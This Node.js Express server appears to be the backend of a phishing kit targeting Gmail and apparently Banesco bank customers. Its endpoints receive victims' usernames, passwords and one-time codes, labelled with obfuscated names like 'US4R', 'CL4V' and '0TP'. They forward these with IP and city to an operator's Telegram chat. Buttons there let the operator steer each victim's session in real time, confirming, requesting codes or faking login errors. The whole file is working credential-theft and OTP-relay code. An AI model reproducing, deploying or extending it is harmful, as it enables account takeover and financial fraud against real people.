const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const CLIENTES_DIR = './clientes';

if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

// Limpieza automática cada 10 minutos: borra clientes con más de 15 minutos
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();
  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.birthtimeMs) / 60000;
    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (${Math.round(edadMinutos)} min)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  // Si es un cliente nuevo, guardamos la fecha de creación
  if (!data.creadoEn) {
    data.creadoEn = Date.now();
  }
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

// === ENVÍO INICIAL ===
app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad, countrycode } = req.body;
  const mensaje = `
🔵GM4YL🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}, ${countrycode}
`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑 CONFIRMAR", callback_data: `confirm:${txid}` },
        { text: "🔢 INGRESAR CÓDIGO", callback_data: `codigo_menu:${txid}` },
        { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});



// === ENVÍO CON CÓDIGO DINÁMICO ===
app.post('/enviar3', async (req, res) => {
  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
  const mensaje = `
🔑🟢B4N3SC0🟢
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>
🔑 0TP: <code>${dinamic}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;
  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑 CÓDIGO", callback_data: `cel-dina:${txid}` },
        { text: "🔢 INGRESAR CÓDIGO", callback_data: `codigo_menu:${txid}` },
        { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});

// === WEBHOOK DE TELEGRAM ===
app.post('/webhook', async (req, res) => {
  // Comando: /txid 25
  if (req.body.message?.text?.startsWith('/')) {
    const commandParts = req.body.message.text.slice(1).trim().split(' ');
    const txid = commandParts[0];
    const codigoStr = commandParts[1]?.trim();

    if (!codigoStr || !/^\d{2}$/.test(codigoStr)) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `⚠️ Formato inválido.\nUsa: /${txid} NN\nEjemplo: /${txid} 25`
        })
      });
      return res.sendStatus(200);
    }

    const cliente = cargarCliente(txid) || { status: 'esperando' };
    cliente.codigo = codigoStr;
    cliente.status = 'codigo_guardado';
    guardarCliente(txid, cliente);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: req.body.message.chat.id,
        text: `✅ Código guardado correctamente para ${txid}\n🔢 Código: ${codigoStr}`
      })
    });
    return res.sendStatus(200);
  }

  // Botones presionados
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const partes = callback.data.split(":");
    const accion = partes[0];
    const txid = partes[1];

    const cliente = cargarCliente(txid) || { status: 'esperando' };

    if (accion === 'confirm') {
      cliente.status = 'confirmado';
    } else if (accion === 'errorlogo') {
      cliente.status = 'error_logo';
    } else if (accion === 'cel-dina') {
      cliente.status = 'codigo_dinamico';
    } else if (accion === 'codigo_menu') {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: callback.message.chat.id,
          text: `🔢 Envía el código de 2 dígitos para ${txid}\nEjemplo: /${txid} 25`
        })
      });
    }

    guardarCliente(txid, cliente);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: "Listo"
      })
    });
    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// === ESTADO PARA TU PÁGINA WEB ===
app.get('/status', (req, res) => {
  const txid = req.query.txid;
  if (!txid) {
    return res.status(400).json({ error: 'Falta txid' });
  }
  const cliente = cargarCliente(txid) || { status: 'esperando' };
  res.json({
    status: cliente.status || 'esperando',
    codigo: cliente.codigo || null
  });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en Render puerto ${PORT}`));
